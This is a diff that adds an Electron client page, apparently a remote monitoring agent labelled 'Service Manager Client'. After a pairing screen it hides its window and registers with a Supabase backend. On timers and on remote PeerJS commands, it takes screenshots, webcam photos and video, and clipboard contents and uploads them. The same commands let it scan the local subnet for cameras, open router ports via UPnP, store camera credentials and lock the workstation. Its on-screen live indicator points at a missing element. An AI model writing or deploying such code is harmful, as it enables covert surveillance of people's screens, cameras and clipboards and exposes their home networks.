@@ -1,0 +1,841 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Service Manager Client</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: white;
+      color: #333;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+    #pairing-overlay {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      height: 100%;
+      position: absolute;
+      top: 0;
+      left: 0;
+      background: white;
+      z-index: 1000;
+    }
+    .title {
+      font-size: 24px;
+      font-weight: 600;
+      margin-bottom: 20px;
+      color: #0D9488;
+    }
+    .device-id {
+      font-size: 48px;
+      font-family: monospace;
+      font-weight: bold;
+      margin-bottom: 30px;
+      padding: 20px;
+      background: #f0fdfa;
+      border: 2px dashed #0D9488;
+      border-radius: 8px;
+      color: #0f766e;
+    }
+    .buttons {
+      display: flex;
+      gap: 15px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-weight: 600;
+      transition: background 0.2s;
+    }
+    .btn-copy {
+      background: #f1f5f9;
+      color: #334155;
+    }
+    .btn-copy:hover { background: #e2e8f0; }
+    .btn-close {
+      background: #0D9488;
+      color: white;
+    }
+    .btn-close:hover { background: #0f766e; }
+  </style>
+</head>
+<body>
+  
+  <div id="pairing-overlay">
+    <div class="title">Kết nối thiết bị mới</div>
+    <div class="device-id" id="display-id">Đang tải...</div>
+    <div class="buttons">
+      <button class="btn-copy" id="btn-copy">Copy ID</button>
+      <button class="btn-close" id="btn-close">Đã cài đặt — Đóng</button>
+    </div>
+  </div>
+
+  <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
+  <script>
+    const os = require('os');
+    const crypto = require('crypto');
+    const { ipcRenderer, clipboard } = require('electron');
+    const net = require('net');
+
+    const SUPABASE_URL = 'https://lfsoronpedvwxxtjqkep.supabase.co';
+    const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imxmc29yb25wZWR2d3h4dGpxa2VwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODMxOTA0NDMsImV4cCI6MjA5ODc2NjQ0M30.FZhJGMFmWmKqyCu8cZ-OlgAJ6Vk7hLO5Ay5_0Qc78aQ';
+    const HEADERS = {
+      'apikey': SUPABASE_KEY,
+      'Authorization': `Bearer ${SUPABASE_KEY}`,
+      'Accept': 'application/json',
+      'Content-Type': 'application/json'
+    };
+
+    let deviceId = localStorage.getItem('sm_device_id');
+    if (!deviceId) {
+      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+      let rand = '';
+      for(let i=0; i<6; i++) rand += chars.charAt(Math.floor(Math.random() * chars.length));
+      deviceId = `SM-${rand}`;
+      localStorage.setItem('sm_device_id', deviceId);
+    }
+
+    const isPaired = localStorage.getItem('sm_paired') === '1';
+    if (!isPaired) {
+      document.getElementById('pairing-overlay').style.display = 'flex';
+      document.getElementById('display-id').textContent = deviceId;
+    }
+
+    document.getElementById('btn-copy').addEventListener('click', () => {
+      clipboard.writeText(deviceId);
+      document.getElementById('btn-copy').textContent = 'Copied!';
+      setTimeout(() => document.getElementById('btn-copy').textContent = 'Copy ID', 2000);
+    });
+
+    document.getElementById('btn-close').addEventListener('click', () => {
+      localStorage.setItem('sm_paired', '1');
+      document.getElementById('pairing-overlay').style.display = 'none';
+      ipcRenderer.invoke('hide-window');
+    });
+
+    // 2. Supabase Registration & Heartbeat
+    let currentSettings = {
+      screen_capture_on: false,
+      screen_interval_min: 5,
+      webcam_capture_on: false,
+      webcam_interval_min: 5,
+      webcam_record_on: false,
+      webcam_record_interval_min: 15,
+      clipboard_monitor_on: false
+    };
+
+    async function supabaseRequest(endpoint, options = {}) {
+      try {
+        const url = `${SUPABASE_URL}${endpoint}`;
+        const res = await fetch(url, {
+          ...options,
+          headers: { ...HEADERS, ...options.headers }
+        });
+        if (!res.ok) {
+          console.error('Supabase API Error:', await res.text());
+          return null;
+        }
+        if (res.status === 204) return true;
+        return await res.json();
+      } catch (err) {
+        console.error('Network Error:', err);
+        return null;
+      }
+    }
+
+    function getSystemInfo() {
+      const cpus = os.cpus();
+      return {
+        hostname: os.hostname(),
+        platform: os.platform(),
+        arch: os.arch(),
+        memory: Math.round(os.totalmem()),
+        cpus: cpus.length
+      };
+    }
+
+    async function registerDevice() {
+      const sys = getSystemInfo();
+      const payload = {
+        device_id: deviceId,
+        hostname: sys.hostname,
+        platform: sys.platform,
+        arch: sys.arch,
+        memory: sys.memory,
+        cpus: sys.cpus,
+        online: true,
+        last_seen: new Date().toISOString()
+      };
+      
+      const res = await supabaseRequest('/rest/v1/sm_devices?on_conflict=device_id', {
+        method: 'POST',
+        headers: { 'Prefer': 'resolution=merge-duplicates' },
+        body: JSON.stringify(payload)
+      });
+      console.log('Registered device:', res);
+    }
+
+    async function heartbeat() {
+      const payload = { online: true, last_seen: new Date().toISOString() };
+      await supabaseRequest(`/rest/v1/sm_devices?device_id=eq.${deviceId}`, {
+        method: 'PATCH',
+        body: JSON.stringify(payload)
+      });
+    }
+
+    async function fetchSettings() {
+      const res = await supabaseRequest(`/rest/v1/sm_devices?select=*&device_id=eq.${deviceId}`);
+      if (res && res.length > 0) {
+        const d = res[0];
+        currentSettings.screen_capture_on = !!d.screen_capture_on;
+        currentSettings.screen_interval_min = d.screen_interval_min || 5;
+        currentSettings.webcam_capture_on = !!d.webcam_capture_on;
+        currentSettings.webcam_interval_min = d.webcam_interval_min || 5;
+        currentSettings.webcam_record_on = !!d.webcam_record_on;
+        currentSettings.webcam_record_interval_min = d.webcam_record_interval_min || 15;
+        currentSettings.clipboard_monitor_on = !!d.clipboard_log_on;
+        applySettings();
+      }
+    }
+
+    window.addEventListener('beforeunload', async () => {
+      await supabaseRequest(`/rest/v1/sm_devices?device_id=eq.${deviceId}`, {
+        method: 'PATCH',
+        body: JSON.stringify({ online: false })
+      });
+    });
+
+    const path = require('path');
+    const http = require('http');
+    let upnpManager = null;
+    let go2rtcManager = null;
+    let autoNetwork = null;
+    try { upnpManager = require('../src/upnp-manager'); } catch(e) { console.log('upnpManager require:', e); }
+    try { go2rtcManager = require('../src/go2rtc-manager'); } catch(e) { console.log('go2rtcManager require:', e); }
+    try { autoNetwork = require('../src/auto-network'); } catch(e) { console.log('autoNetwork require:', e); }
+
+    // Subnet Scan for Cameras & WiFi Devices
+    function getLocalIpAndSubnet() {
+      const nets = os.networkInterfaces();
+      for (const name of Object.keys(nets)) {
+        for (const net of nets[name]) {
+          if (net.family === 'IPv4' && !net.internal) {
+            return { ip: net.address, cidr: net.cidr, netmask: net.netmask };
+          }
+        }
+      }
+      return null;
+    }
+
+    function checkPort(ip, port, timeout = 350) {
+      return new Promise((resolve) => {
+        const socket = new net.Socket();
+        socket.setTimeout(timeout);
+        let isOpen = false;
+        socket.on('connect', () => { isOpen = true; socket.destroy(); });
+        socket.on('timeout', () => socket.destroy());
+        socket.on('error', () => socket.destroy());
+        socket.on('close', () => resolve(isOpen));
+        socket.connect(port, ip);
+      });
+    }
+
+    async function scanNetworkDevices(targetSubnets = null) {
+      const network = getLocalIpAndSubnet();
+      const subnetsToScan = [];
+      
+      if (targetSubnets && Array.isArray(targetSubnets) && targetSubnets.length > 0) {
+        subnetsToScan.push(...targetSubnets);
+      } else if (network) {
+        const ipParts = network.ip.split('.').map(Number);
+        const maskParts = network.netmask.split('.').map(Number);
+        const baseIpParts = ipParts.map((p, i) => p & maskParts[i]);
+        subnetsToScan.push(`${baseIpParts[0]}.${baseIpParts[1]}.${baseIpParts[2]}`);
+      } else {
+        subnetsToScan.push('192.168.1', '192.168.0');
+      }
+
+      const IPs = [];
+      for (const subnet of subnetsToScan) {
+        for (let i = 1; i < 255; i++) {
+          IPs.push(`${subnet}.${i}`);
+        }
+      }
+
+      // Check camera & network ports:
+      // 554: RTSP (Tapo, Hikvision, Dahua, ICSee)
+      // 2020: Tapo ONVIF
+      // 34567: ICSee/Xiongmai DVRIP
+      // 8899: Generic ONVIF
+      // 80: HTTP Web interface
+      // 8000: Hikvision Control
+      const ports = [554, 2020, 34567, 8899, 80, 8000];
+      const concurrency = 60;
+      let i = 0;
+      const found = {};
+
+      async function worker() {
+        while (i < IPs.length) {
+          const ip = IPs[i++];
+          if (network && ip === network.ip) continue;
+
+          for (const port of ports) {
+            const open = await checkPort(ip, port, 300);
+            if (open) {
+              if (!found[ip]) found[ip] = { ip, openPorts: [] };
+              found[ip].openPorts.push(port);
+            }
+          }
+        }
+      }
+
+      const workers = [];
+      for (let w = 0; w < concurrency; w++) workers.push(worker());
+      await Promise.all(workers);
+
+      // Classify discovered devices
+      const results = Object.values(found).map(d => {
+        let type = 'device';
+        let label = 'Thiết bị mạng';
+        let isCamera = false;
+        let defaultRtspPath = '/stream1';
+
+        if (d.openPorts.includes(2020) || (d.openPorts.includes(554) && !d.openPorts.includes(34567))) {
+          type = 'tapo';
+          label = 'TP-Link Tapo Camera';
+          isCamera = true;
+          defaultRtspPath = '/stream1';
+        } else if (d.openPorts.includes(34567)) {
+          type = 'icsee';
+          label = 'ICSee / Xiongmai Camera';
+          isCamera = true;
+          defaultRtspPath = '/cam/realmonitor?channel=1&subtype=0';
+        } else if (d.openPorts.includes(8000) || d.openPorts.includes(554)) {
+          type = 'camera';
+          label = 'Camera IP (RTSP / ONVIF)';
+          isCamera = true;
+          defaultRtspPath = '/stream1';
+        } else if (d.openPorts.includes(80)) {
+          label = 'Router / Web Service';
+        }
+
+        return {
+          ip: d.ip,
+          type,
+          label,
+          isCamera,
+          openPorts: d.openPorts,
+          defaultRtspPath
+        };
+      });
+
+      return results;
+    }
+
+    async function setupCameraStream(rtspUrl, streamName = 'camera') {
+      try {
+        // Clear any old stream configuration first
+        await fetch(`http://127.0.0.1:1984/api/streams?name=${encodeURIComponent(streamName)}`, {
+          method: 'DELETE'
+        }).catch(() => {});
+
+        const encodedSrc = encodeURIComponent(rtspUrl);
+        const res = await fetch(`http://127.0.0.1:1984/api/streams?name=${encodeURIComponent(streamName)}&src=${encodedSrc}`, {
+          method: 'PUT'
+        });
+        console.log('go2rtc addStream result:', res.status, 'for url:', rtspUrl);
+        
+        return { success: true, streamName, rtspUrl };
+      } catch(e) {
+        console.error('setupCameraStream error:', e);
+        return { success: false, error: e.message };
+      }
+    }
+
+    // Capture & Upload Utils
+    async function uploadStorage(path, blob, contentType) {
+      const url = `${SUPABASE_URL}/storage/v1/object/sm-captures/${path}`;
+      const res = await fetch(url, {
+        method: 'POST',
+        headers: {
+          'apikey': SUPABASE_KEY,
+          'Authorization': `Bearer ${SUPABASE_KEY}`,
+          'Content-Type': contentType
+        },
+        body: blob
+      });
+      if(res.ok) return `${SUPABASE_URL}/storage/v1/object/public/sm-captures/${path}`;
+      return null;
+    }
+
+    async function recordCapture(type, fileUrl, metadata = {}, thumbnail = null) {
+      await supabaseRequest('/rest/v1/sm_captures', {
+        method: 'POST',
+        body: JSON.stringify({
+          device_id: deviceId,
+          type: type,
+          storage_path: fileUrl,
+          thumbnail: thumbnail,
+          metadata: metadata
+        })
+      });
+    }
+
+    // Screenshots
+    async function captureScreenshot() {
+      try {
+        const source = await ipcRenderer.invoke('get-desktop-source');
+        if (!source) return null;
+        
+        const video = document.createElement('video');
+        video.srcObject = await navigator.mediaDevices.getUserMedia({
+          audio: false,
+          video: {
+            mandatory: {
+              chromeMediaSource: 'desktop',
+              chromeMediaSourceId: source.id
+            }
+          }
+        });
+        
+        await new Promise(r => video.onloadedmetadata = r);
+        video.play();
+        
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 1280;
+        canvas.height = video.videoHeight || 720;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+        video.srcObject.getTracks().forEach(t => t.stop());
+        
+        const filename = `${deviceId}/screenshot/${Date.now()}.jpg`;
+        const url = await uploadStorage(filename, blob, 'image/jpeg');
+        await recordCapture('screenshot', url || filename, {}, dataUrl);
+        return dataUrl;
+      } catch (e) {
+        console.error('Screenshot error:', e);
+        return null;
+      }
+    }
+
+    // Webcam
+    async function captureWebcamPhoto() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await new Promise(r => video.onloadedmetadata = r);
+        video.play();
+        
+        await new Promise(r => setTimeout(r, 400));
+        
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+        stream.getTracks().forEach(t => t.stop());
+        
+        const filename = `${deviceId}/webcam/${Date.now()}.jpg`;
+        const url = await uploadStorage(filename, blob, 'image/jpeg');
+        await recordCapture('webcam', url || filename, {}, dataUrl);
+        return dataUrl;
+      } catch(e) {
+        console.error('Webcam photo error:', e);
+        return null;
+      }
+    }
+
+    let mediaRecorder = null;
+    let recordedChunks = [];
+    async function startWebcamRecord(durationSec = 30) {
+      if(mediaRecorder) return;
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(() => navigator.mediaDevices.getUserMedia({ video: true }));
+        const options = { mimeType: 'video/webm;codecs=vp9,opus' };
+        mediaRecorder = new MediaRecorder(stream, options);
+        recordedChunks = [];
+        
+        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
+        mediaRecorder.onstop = async () => {
+          const blob = new Blob(recordedChunks, { type: 'video/webm' });
+          const filename = `${deviceId}/webcam_video/${Date.now()}.webm`;
+          const url = await uploadStorage(filename, blob, 'video/webm');
+          if(url) await recordCapture('webcam_video', url);
+          
+          stream.getTracks().forEach(t => t.stop());
+          mediaRecorder = null;
+        };
+        
+        mediaRecorder.start(1000);
+        setTimeout(() => stopWebcamRecord(), durationSec * 1000);
+      } catch (e) {
+        console.error('Webcam record error:', e);
+      }
+    }
+
+    function stopWebcamRecord() {
+      if(mediaRecorder && mediaRecorder.state !== 'inactive') {
+        mediaRecorder.stop();
+      }
+    }
+
+    // Clipboard
+    let lastClipboardText = '';
+    function checkClipboard() {
+      if(!currentSettings.clipboard_monitor_on) return;
+      const txt = clipboard.readText();
+      if(txt && txt !== lastClipboardText) {
+        lastClipboardText = txt;
+        recordCapture('clipboard', null, { content: txt });
+      }
+    }
+
+    // Timers
+    let timers = {};
+    function applySettings() {
+      if (currentSettings.screen_capture_on) {
+        if (!timers.screen) timers.screen = setInterval(captureScreenshot, currentSettings.screen_interval_min * 60000);
+      } else {
+        clearInterval(timers.screen); timers.screen = null;
+      }
+
+      if (currentSettings.webcam_capture_on) {
+        if (!timers.webcam) timers.webcam = setInterval(captureWebcamPhoto, currentSettings.webcam_interval_min * 60000);
+      } else {
+        clearInterval(timers.webcam); timers.webcam = null;
+      }
+
+      if (currentSettings.webcam_record_on) {
+        if (!timers.webcamRecord) timers.webcamRecord = setInterval(() => startWebcamRecord(30), currentSettings.webcam_record_interval_min * 60000);
+      } else {
+        clearInterval(timers.webcamRecord); timers.webcamRecord = null;
+      }
+      
+      if (currentSettings.clipboard_monitor_on) {
+        if (!timers.clipboard) timers.clipboard = setInterval(checkClipboard, 10000);
+      } else {
+        clearInterval(timers.clipboard); timers.clipboard = null;
+      }
+    }
+
+    // PeerJS
+    const peer = new Peer(deviceId, {
+      config: {
+        'iceServers': [
+          { urls: 'stun:stun.l.google.com:19302' },
+          { urls: 'stun:stun1.l.google.com:19302' },
+          { urls: 'stun:stun2.l.google.com:19302' }
+        ]
+      }
+    });
+
+    peer.on('open', id => console.log('Peer connected as:', id));
+    
+    // Live Stream Call Handler (from Manager - supports Webcam & Screen Share)
+    peer.on('call', async (call) => {
+      console.log('Incoming live stream call:', call.metadata);
+      let stream = null;
+      const type = call.metadata?.type || 'webcam';
+      
+      try {
+        if (type === 'screen') {
+          const sourceId = await ipcRenderer.invoke('get-desktop-source').catch(() => null);
+          if (sourceId) {
+            stream = await navigator.mediaDevices.getUserMedia({
+              audio: false,
+              video: {
+                mandatory: {
+                  chromeMediaSource: 'desktop',
+                  chromeMediaSourceId: sourceId,
+                  maxWidth: 1920,
+                  maxHeight: 1080
+                }
+              }
+            });
+          }
+        }
+        
+        if (!stream) {
+          stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { width: { ideal: 1280 }, height: { ideal: 720 } },
+            audio: true 
+          }).catch(() => navigator.mediaDevices.getUserMedia({ video: true }));
+        }
+        
+        call.answer(stream);
+        showLiveWebcamIndicator(true, type);
+        
+        call.on('close', () => {
+          if (stream) stream.getTracks().forEach(t => t.stop());
+          showLiveWebcamIndicator(false);
+        });
+        call.on('error', () => {
+          if (stream) stream.getTracks().forEach(t => t.stop());
+          showLiveWebcamIndicator(false);
+        });
+      } catch(e) {
+        console.error('Failed to answer live stream call:', e);
+        showLiveWebcamIndicator(false);
+      }
+    });
+
+    function showLiveWebcamIndicator(active, type = 'webcam') {
+      const banner = document.getElementById('liveIndicatorBanner');
+      if (banner) {
+        banner.style.display = active ? 'block' : 'none';
+        banner.textContent = `🔴 ĐANG PHÁT TRỰC TIẾP: ${type.toUpperCase()}`;
+      }
+      console.log(`[CLIENT-STREAM] Live status: ${active} (${type})`);
+    }
+
+    peer.on('connection', conn => {
+      conn.on('data', async data => {
+        console.log('Received command:', data);
+        if (data.cmd === 'snap-screen') {
+          const url = await captureScreenshot();
+          conn.send({ cmd: 'snap-screen-result', url });
+        } else if (data.cmd === 'snap-webcam') {
+          const url = await captureWebcamPhoto();
+          conn.send({ cmd: 'snap-webcam-result', url });
+        } else if (data.cmd === 'get-clipboard') {
+          const text = clipboard.readText();
+          await recordCapture('clipboard', null, { text: text });
+          conn.send({ cmd: 'get-clipboard-result', text });
+        } else if (data.cmd === 'sync-settings') {
+          currentSettings = { ...currentSettings, ...data };
+          applySettings();
+          conn.send({ cmd: 'sync-settings-ok' });
+        } else if (data.cmd === 'start-webcam-record') {
+          startWebcamRecord(data.duration || 30);
+          conn.send({ cmd: 'webcam-record-started' });
+        } else if (data.cmd === 'stop-webcam-record') {
+          stopWebcamRecord();
+          conn.send({ cmd: 'webcam-record-stopped' });
+        } else if (data.cmd === 'get-network-info') {
+          const netInfo = getLocalIpAndSubnet();
+          let extIp = upnpManager ? upnpManager.getExternalIp() : null;
+          if (!extIp) {
+            try {
+              const res = await fetch('https://api.ipify.org?format=json');
+              const json = await res.json();
+              if (json && json.ip) extIp = json.ip;
+            } catch(e) {}
+          }
+          const upnpOk = upnpManager ? upnpManager.isAvailable() : false;
+          const mappings = upnpManager ? upnpManager.getMappings() : [];
+          conn.send({
+            cmd: 'get-network-info-result',
+            data: {
+              localIp: netInfo?.ip || '127.0.0.1',
+              subnet: netInfo?.netmask || '255.255.255.0',
+              externalIp: extIp || 'Chưa phát hiện',
+              upnpAvailable: upnpOk,
+              mappings: mappings
+            }
+          });
+        } else if (data.cmd === 'scan-wifi-devices') {
+          const devices = await scanNetworkDevices(data.targetSubnets);
+          conn.send({ cmd: 'scan-wifi-devices-result', devices });
+        } else if (data.cmd === 'open-port') {
+          let ok = false;
+          if (upnpManager) {
+            ok = await upnpManager.openCustomPort(data.publicPort, data.privatePort, data.targetIp, data.protocol || 'TCP', data.description || '');
+          }
+          const mappings = upnpManager ? upnpManager.getMappings() : [];
+          conn.send({ cmd: 'open-port-result', success: ok, mappings });
+        } else if (data.cmd === 'close-port') {
+          let ok = false;
+          if (upnpManager) {
+            ok = await upnpManager.closePort(data.publicPort, data.protocol || 'TCP');
+          }
+          const mappings = upnpManager ? upnpManager.getMappings() : [];
+          conn.send({ cmd: 'close-port-result', success: ok, mappings });
+        } else if (data.cmd === 'setup-camera-stream') {
+          const res = await setupCameraStream(data.rtspUrl, data.streamName || 'camera');
+          if (data.cameraIp) {
+            await supabaseRequest(`/rest/v1/sm_devices?device_id=eq.${deviceId}`, {
+              method: 'PATCH',
+              body: JSON.stringify({
+                camera_ip: data.cameraIp,
+                camera_rtsp_port: 554
+              })
+            });
+          }
+          conn.send({ cmd: 'setup-camera-stream-result', ...res });
+        } else if (data.cmd === 'webrtc-exchange') {
+          try {
+            const src = data.src || 'camera';
+            const offerSdp = data.offer;
+            const res = await fetch(`http://127.0.0.1:1984/api/webrtc?src=${encodeURIComponent(src)}`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/sdp' },
+              body: offerSdp
+            });
+            if (res.ok) {
+              const answerSdp = await res.text();
+              conn.send({ cmd: 'webrtc-exchange-answer', answer: answerSdp, success: true });
+            } else {
+              const errText = await res.text();
+              conn.send({ cmd: 'webrtc-exchange-answer', success: false, error: errText });
+            }
+          } catch (e) {
+            conn.send({ cmd: 'webrtc-exchange-answer', success: false, error: e.message });
+          }
+        } else if (data.cmd === 'get-auto-network-status') {
+          // Dashboard requests current auto-network state
+          const status = autoNetwork ? autoNetwork.getStatus() : { setupComplete: false, cameras: [] };
+          // Also get fresh external IP
+          let extIp = upnpManager ? upnpManager.getExternalIp() : null;
+          if (!extIp) {
+            try {
+              const res = await fetch('https://api.ipify.org?format=json');
+              const json = await res.json();
+              if (json && json.ip) extIp = json.ip;
+            } catch(e) {}
+          }
+          status.externalIp = extIp;
+          conn.send({ cmd: 'get-auto-network-status-result', data: status });
+        } else if (data.cmd === 'save-camera-credentials') {
+          // Dashboard sends camera credentials to save
+          const creds = { user: data.user || '', pass: data.pass || '' };
+          localStorage.setItem('sm_auto_camera_creds', JSON.stringify(creds));
+          // Re-run auto-setup with new credentials
+          if (autoNetwork) {
+            autoNetwork.rescan(creds).then(result => {
+              conn.send({ cmd: 'save-camera-credentials-result', success: true, autoNetwork: result });
+            }).catch(err => {
+              conn.send({ cmd: 'save-camera-credentials-result', success: false, error: err.message });
+            });
+          } else {
+            conn.send({ cmd: 'save-camera-credentials-result', success: true });
+          }
+        } else if (data.cmd === 'force-rescan-network') {
+          // Force re-scan the network
+          if (autoNetwork) {
+            let savedCreds = null;
+            try {
+              const savedJson = localStorage.getItem('sm_auto_camera_creds');
+              if (savedJson) savedCreds = JSON.parse(savedJson);
+            } catch(e) {}
+            autoNetwork.rescan(savedCreds).then(result => {
+              conn.send({ cmd: 'force-rescan-network-result', success: true, data: result });
+            }).catch(err => {
+              conn.send({ cmd: 'force-rescan-network-result', success: false, error: err.message });
+            });
+          } else {
+            conn.send({ cmd: 'force-rescan-network-result', success: false, error: 'Auto-network not loaded' });
+          }
+        } else if (data.cmd === 'lock') {
+          ipcRenderer.invoke('lock-workstation');
+        } else if (data.cmd === 'alarm') {
+          playAlarm();
+        } else if (data.cmd === 'ping') {
+          conn.send({ cmd: 'pong' });
+        }
+      });
+    });
+
+    // Audio Alarm
+    let audioCtx;
+    function playAlarm() {
+      if(!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+      const osc = audioCtx.createOscillator();
+      const gain = audioCtx.createGain();
+      osc.type = 'sawtooth';
+      
+      osc.frequency.setValueAtTime(880, audioCtx.currentTime);
+      for(let i=0; i<10; i++) {
+        osc.frequency.setValueAtTime(440, audioCtx.currentTime + i*0.5 + 0.25);
+        osc.frequency.setValueAtTime(880, audioCtx.currentTime + i*0.5 + 0.5);
+      }
+      
+      gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
+      osc.connect(gain);
+      gain.connect(audioCtx.destination);
+      osc.start();
+      osc.stop(audioCtx.currentTime + 5);
+    }
+
+    // Startup
+    async function start() {
+      if (upnpManager) {
+        upnpManager.start().then((available) => {
+          console.log('UPnP initialized:', available);
+          const extIp = upnpManager.getExternalIp();
+          if (extIp) {
+            supabaseRequest(`/rest/v1/sm_devices?device_id=eq.${deviceId}`, {
+              method: 'PATCH',
+              body: JSON.stringify({ external_ip: extIp })
+            });
+          }
+        }).catch(err => console.log('UPnP start error:', err));
+      }
+
+      await registerDevice();
+      await fetchSettings();
+      
+      setInterval(async () => {
+        await heartbeat();
+        await fetchSettings();
+      }, 45000);
+
+      // ─── AUTO-NETWORK: Fully Automatic Camera Discovery & Setup ───
+      if (autoNetwork) {
+        // Load saved camera credentials from localStorage
+        let savedCreds = null;
+        try {
+          const savedJson = localStorage.getItem('sm_auto_camera_creds');
+          if (savedJson) savedCreds = JSON.parse(savedJson);
+        } catch(e) {}
+
+        // Also try to load from existing camera config
+        if (!savedCreds) {
+          try {
+            const camConfig = localStorage.getItem('sm_camera_' + deviceId);
+            if (camConfig) {
+              const parsed = JSON.parse(camConfig);
+              if (parsed.user || parsed.pass) {
+                savedCreds = { user: parsed.user || '', pass: parsed.pass || '' };
+              }
+            }
+          } catch(e) {}
+        }
+
+        console.log('[client] Starting auto-network discovery system...');
+        autoNetwork.init({
+          upnpMgr: upnpManager,
+          go2rtcMgr: go2rtcManager,
+          supabaseReq: supabaseRequest,
+          devId: deviceId,
+          credentials: savedCreds
+        }).then(result => {
+          console.log('[client] Auto-network setup result:', JSON.stringify(result, null, 2));
+        }).catch(err => {
+          console.log('[client] Auto-network setup error:', err.message);
+        });
+      }
+    }
+
+    start();
+
+  </script>
+</body>
+</html>
